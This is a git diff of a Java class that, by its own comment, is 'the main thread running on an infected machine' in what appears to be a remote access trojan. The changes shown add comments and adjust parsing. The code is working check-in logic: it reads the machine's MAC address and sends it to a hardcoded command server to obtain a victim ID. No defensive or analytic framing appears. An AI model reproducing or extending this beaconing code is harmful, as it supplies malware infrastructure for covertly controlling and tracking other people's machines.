@@ -5,6 +5,12 @@ import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.util.Enumeration;
 
+/**
+ * The main thread running on an infected machine
+ * 
+ * @author Yohan Chalier
+ *
+ */
 public class Client extends Thread {
 	
 	private static final String SERVER_URL = "http://rat.chalier.fr";
@@ -18,8 +24,7 @@ public class Client extends Thread {
 		try {
 			MAC = getMAC();
 			id = Integer.parseInt(
-					HTTPRequest.send(SERVER_URL, "GETID " + MAC)
-					.replaceAll("\r", ""));
+					HTTPRequest.send(SERVER_URL, "GETID " + MAC));
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -52,8 +57,10 @@ public class Client extends Thread {
 	                
 	                if (!inetAddr.isLoopbackAddress()) {
 	                	
+	                	// Binary representation of MAC address
 	                	byte[] mac = iface.getHardwareAddress();
 	                	
+	                	// Printing into a string to be returned
 	                	StringBuilder sb = new StringBuilder();
 	            		for (int i = 0; i < mac.length; i++) {
 	            			sb.append(String.format(
